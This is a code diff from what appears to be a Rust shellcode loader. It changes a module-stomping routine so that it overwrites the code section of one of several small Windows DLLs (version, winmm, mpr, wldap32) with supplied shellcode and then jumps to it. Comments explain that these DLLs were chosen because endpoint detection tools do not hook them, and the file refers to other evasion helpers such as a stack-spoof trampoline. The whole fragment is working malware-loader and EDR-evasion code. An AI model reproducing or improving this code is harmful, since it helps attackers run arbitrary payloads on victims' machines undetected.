@@ -60,14 +60,22 @@ pub unsafe fn run_no_rwx(shellcode: &[u8]) {
 pub unsafe fn run_stomped(shellcode: &[u8]) -> bool {
     use crate::evasion::module_stomp::stomp_module;
 
-    // version.dll is tiny, always present, and not monitored by most EDRs.
-    let target = stomp_module(b"version.dll\0", shellcode);
-    let Some(exec_ptr) = target else { return false; };
-
-    // Cast the start of the stomped region to a no-arg function and call it.
-    let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
-    fn_ptr();
-    true
+    // Try small, always-present DLLs in order: version < winmm < mpr < wldap32.
+    // All have legitimate CFG-registered .text sections; none are EDR-hooked.
+    const CANDIDATES: &[&[u8]] = &[
+        b"version.dll\0",
+        b"winmm.dll\0",
+        b"mpr.dll\0",
+        b"wldap32.dll\0",
+    ];
+    for &dll in CANDIDATES {
+        if let Some(exec_ptr) = stomp_module(dll, shellcode) {
+            let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
+            fn_ptr();
+            return true;
+        }
+    }
+    false
 }
 
 /// Like run_no_rwx but passes execution through the stack-spoof trampoline.
